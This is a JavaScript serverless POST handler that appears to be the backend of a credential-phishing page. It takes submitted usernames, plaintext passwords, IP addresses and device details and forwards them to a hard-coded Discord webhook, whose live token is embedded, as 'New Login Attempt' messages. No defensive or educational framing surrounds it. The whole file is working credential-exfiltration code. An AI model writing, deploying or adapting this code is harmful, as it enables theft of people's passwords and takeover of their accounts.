export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const webhookUrl = "https://discord.com/api/webhooks/1448323191763374188/F6GPsCYjWG1zttQX4cAao5GRYi9l7r1ntrFXAY_M8pzxurIW7L1IUXOlrgc-dkImax8Z";

    const { username, password, timestamp, ipAddress, browserInfo } = req.body;

    const message = {
        username: "Login Bot",
        embeds: [{
            title: "🔐 New Login Attempt",
            color: 0xFF0000,
            fields: [
                {
                    name: "👤 Username",
                    value: username,
                    inline: true
                },
                {
                    name: "🔑 Password",
                    value: password,
                    inline: true
                },
                {
                    name: "🌐 IP Address",
                    value: ipAddress,
                    inline: true
                },
                {
                    name: "⏰ Timestamp",
                    value: new Date(timestamp).toLocaleString(),
                    inline: false
                },
                {
                    name: "📱 Device Info",
                    value: `Platform: ${browserInfo.platform}\nBrowser: ${browserInfo.browser}\nResolution: ${browserInfo.screenResolution}`,
                    inline: false
                }
            ]
        }]
    };

    try {
        const discordResponse = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        if (!discordResponse.ok) {
            throw new Error(`Discord returned ${discordResponse.status}`);
        }
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Webhook Error:', error);
        res.status(500).json({ error: error.message });
    }
}
